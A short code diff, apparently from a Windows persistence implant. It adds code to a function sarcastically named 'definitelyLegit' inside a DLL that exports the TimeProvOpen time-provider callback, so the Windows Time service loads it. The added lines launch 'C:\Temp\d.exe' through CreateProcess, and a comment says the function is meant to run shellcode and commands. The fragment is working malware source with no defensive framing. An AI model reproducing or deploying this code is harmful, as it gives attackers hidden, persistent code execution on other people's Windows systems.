@@ -14,6 +14,15 @@ DWORD dwPollInterval;
 
 void definitelyLegit() {
     // execute shellcode, executables, commands ...
+
+    STARTUPINFO si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+
+    RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
+    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+
+    CreateProcess("C:\\Temp\\d.exe", "", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+
 }
 
 HRESULT CALLBACK TimeProvOpen(WCHAR* wszName, TimeProvSysCallbacks* pSysCallback, TimeProvHandle* phTimeProv) {
